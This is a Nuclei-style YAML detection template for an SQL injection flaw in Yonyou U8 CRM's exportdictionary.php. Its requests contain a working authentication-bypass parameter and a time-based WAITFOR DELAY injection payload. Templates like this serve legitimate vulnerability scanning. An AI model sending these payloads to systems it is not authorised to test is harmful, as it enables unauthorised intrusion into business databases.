id: poc-yaml-yongyon-u8-crm-exportdictionary-php-sqli

info:
  name: 用友U8CRM exportdictionary.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This detects an SQL injection vulnerability in 用友U8CRM exportdictionary.php.

variables:
  t1: '{{rand_int(2,6)}}'
  t2: '{{to_number(t1)+2}}'

flow: http(1) && http(2)

http:
  - id: check-database-error
    method: GET
    path:
      - "{{BaseURL}}/devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Database error"

  - id: check-time-delay
    method: GET
    path:
      - "{{BaseURL}}/devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:{{t1}}%27--"
    headers:
      Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "delete from"
      - type: word
        words:
          - "<"
        negative: true
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
